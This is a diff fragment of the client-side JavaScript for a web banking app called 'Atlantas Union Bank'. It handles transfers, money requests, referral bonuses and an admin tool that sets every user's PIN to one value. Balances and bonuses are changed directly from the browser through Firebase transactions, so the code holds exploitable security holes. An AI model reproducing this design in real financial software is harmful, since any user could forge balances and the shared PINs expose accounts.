+    // Get recipient name - try publicDirectory, fall back to users node
+    function getRecipientInfo(ruid,acct,callback){
+      db.ref('publicDirectory/'+ruid).once('value').then(function(pub){
+        if(pub.exists()&&pub.val().firstname){
+          callback(pub.val().firstname+' '+pub.val().surname, pub.val().accountNumber||acct);
+        } else {
+          db.ref('users/'+ruid).once('value').then(function(us){
+            var u=us.val();
+            var name=u&&u.firstname?(u.firstname+' '+u.surname):acct;
+            var an=u&&u.accountNumber?u.accountNumber:acct;
+            callback(name,an);
+          }).catch(function(){callback(acct,acct);});
+        }
+      }).catch(function(){callback(acct,acct);});
+    }
+    getRecipientInfo(ruid,acct,function(recipName,recipAcct){
+      return userRef.transaction(function(u){if(u){u.balance=(parseFloat(u.balance)||0)-amt;u.history=u.history||[];u.history.push({date:now,type:'Sent',amount:-amt,note:'Sent to '+recipName,counterparty:recipName,counterpartyAcct:recipAcct});}return u;}).then(function(){
+        return db.ref('users/'+ruid).transaction(function(u){if(u){u.balance=(parseFloat(u.balance)||0)+amt;u.history=u.history||[];u.history.push({date:now,type:'Received',amount:amt,note:'From '+myName,counterparty:myName,counterpartyAcct:myAcct});}return u;});
+      }).then(function(){
+        notify(ruid,'💸 '+myName+' sent you '+s+amt.toFixed(2)+'!');
+        // Email the recipient
+        db.ref('users/'+ruid+'/email').once('value').then(function(eSnap){
+          if(eSnap.exists()){
+            sendEmail(eSnap.val(),
+              '💸 Money Received',
+              recipName,
+              'You have received '+s+amt.toFixed(2)+' from '+myName+'.\n\nSender Account: '+myAcct+'\nDate: '+new Date().toLocaleString()+'\n\nAtlantas Union Bank'
+            );
+          }
+        });
+        $('send-acct').value='';$('send-amount').value='';$('send-pin').value='';$('send-acct-info').style.display='none';
+        err.style.color='#00a550';err.textContent='\u2705 '+s+amt.toFixed(2)+' sent to '+recipName+'!';
+        setTimeout(function(){err.textContent='';err.style.color='#e53935';},4000);
+      });
+    }).finally(function(){$('send-btn').textContent='Send Now';$('send-btn').disabled=false;});
+  });
+};
+
+// REQUEST MONEY
+$('req-acct').oninput=function(){
+  var val=this.value.trim(),info=$('req-acct-info');
+  if(val.length===10){
+    db.ref('accountNumbers/'+val).once('value').then(function(snap){
+      if(!snap.exists()){info.style.display='block';info.textContent='\u274c Account not found';return;}
+      var ruid=snap.val();
+      db.ref('publicDirectory/'+ruid).once('value').then(function(pub){
+        if(pub.exists()&&pub.val().firstname){
+          info.style.display='block';
+          info.textContent='\u2705 '+pub.val().firstname+' '+pub.val().surname;
+        } else {
+          db.ref('users/'+ruid).once('value').then(function(us){
+            var u=us.val();
+            info.style.display='block';
+            info.textContent=u&&u.firstname?'\u2705 '+u.firstname+' '+u.surname:'\u2705 Account found';
+          }).catch(function(){info.style.display='block';info.textContent='\u2705 Account found';});
+        }
+      }).catch(function(){info.style.display='block';info.textContent='\u2705 Account found';});
+    });
+  } else {info.style.display='none';}
+};
+$('req-btn').onclick=function(){
+  var acct=$('req-acct').value.trim(),amt=parseFloat($('req-amount').value),note=$('req-note').value.trim(),err=$('req-error');err.textContent='';
+  if(!acct||acct.length!==10){err.textContent='Enter a valid 10-digit account number.';return;}
+  if(!amt||amt<=0){err.textContent='Enter a valid amount.';return;}
+  db.ref('accountNumbers/'+acct).once('value').then(function(snap){
+    if(!snap.exists()){err.textContent='Account not found.';return;}
+    var targetUid=snap.val();if(targetUid===currentUser.uid){err.textContent="Can't request from yourself.";return;}
+    var s=sym(),myName=(userData.firstname||'')+' '+(userData.surname||''),myAcct=userData.accountNumber||'';
+    var reqId='req_'+Date.now()+'_'+Math.random().toString(36).slice(2,5);
+    $('req-btn').textContent='Sending...';$('req-btn').disabled=true;
+    db.ref('moneyRequests/'+targetUid+'/'+reqId).set({id:reqId,fromUid:currentUser.uid,fromName:myName,fromAcct:myAcct,toUid:targetUid,amount:amt,currency:userData.currency||'USD',note:note,status:'pending',date:new Date().toISOString()}).then(function(){
+      notify(targetUid,'📩 '+myName+' is requesting '+s+amt.toFixed(2)+' from you.'+(note?' Note: '+note:'')+' Open app to respond.');
+      // Email the target
+      db.ref('users/'+targetUid+'/email').once('value').then(function(eSnap){
+        if(eSnap.exists()){
+          sendEmail(eSnap.val(),
+            '📩 Money Request',
+            '',
+            myName+' is requesting '+s+amt.toFixed(2)+' from you.'+(note?' Note: '+note:'')+' Please log in to accept or decline.\n\nAtlantas Union Bank'
+          );
+        }
+      });
+      $('req-acct').value='';$('req-amount').value='';$('req-note').value='';$('req-acct-info').style.display='none';
+      err.style.color='#00a550';err.textContent='\u2705 Request sent!';setTimeout(function(){err.textContent='';err.style.color='#e53935';},4000);
+    }).finally(function(){$('req-btn').textContent='Send Request';$('req-btn').disabled=false;});
+  });
+};
+
+// REFERRAL
+$('refer-copy-btn').onclick=function(){var code=userData.referralCode||'';if(!code) return;navigator.clipboard.writeText(code).then(function(){alert('Copied: '+code);}).catch(function(){alert('Your code: '+code);});};
+$('offer-refer-btn').onclick=function(){switchTab('tab-refer',$('nav-refer'));};
+$('refer-claim-btn').onclick=function(){
+  var count=(userData.referrals||[]).length;if(count<12){alert('Need 12 referrals. Have '+count+'.');return;}if(userData.referralClaimed){alert('Already claimed!');return;}
+  var s=sym(),bonus=count*10;
+  userRef.transaction(function(u){if(u){u.balance=(parseFloat(u.balance)||0)+bonus;u.referralClaimed=true;}return u;}).then(function(){notify(currentUser.uid,'🎉 Referral bonus of '+s+bonus+' added!');alert('\u2705 '+s+bonus+' claimed!');});
+};
+
+// ADMIN PANEL
+$('change-all-pins-btn').onclick=function(){
+  var pin=$('global-pin').value.trim();if(!pin||pin.length!==4){alert('Enter a 4-digit PIN.');return;}if(!confirm('Change ALL user PINs to '+pin+'?')) return;
+  db.ref('users').once('value').then(function(snap){var p=[];snap.forEach(function(s){if(s.val()&&s.val().email!==ADMIN_EMAIL) p.push(db.ref('users/'+s.key+'/pin').set(pin));});return Promise.all(p);}).then(function(){alert('All PINs updated!');});
+};
+
+window.openReferModal=function(){closeDrawer();switchTab('tab-refer',$('nav-refer'));};
+
+// ── SEND / REQUEST CHOOSER ──
+window.showSendReqChooser=function(){
+  $('sendreq-chooser').style.display='block';
+  $('sendreq-send').style.display='none';
+  $('sendreq-request').style.display='none';
+};
+$('choose-send-btn').onclick=function(){
+  $('sendreq-chooser').style.display='none';
+  $('sendreq-send').style.display='block';
+  $('sendreq-request').style.display='none';
+  $('send-acct').value=''; $('send-amount').value=''; $('send-pin').value='';
+  $('send-acct-info').style.display='none'; $('send-error').textContent='';
+};
+$('choose-req-btn').onclick=function(){
+  $('sendreq-chooser').style.display='none';
+  $('sendreq-request').style.display='block';
+  $('sendreq-send').style.display='none';
+  $('req-acct').value=''; $('req-amount').value=''; $('req-note').value='';
+  $('req-acct-info').style.display='none'; $('req-error').textContent='';
+};
+// Reset to chooser when leaving the Send/Request tab
+var _origSwitchTab=switchTab;
+switchTab=function(tabId,btn){
+  _origSwitchTab(tabId,btn);
+  if(tabId!=='tab-sendreq'&&$('sendreq-chooser')){
+    $('sendreq-chooser').style.display='block';
+    $('sendreq-send').style.display='none';
+    $('sendreq-request').style.display='none';
+  }
+};
+
+}); // END DOMContentLoaded
+</script>
 </body>
 </html>
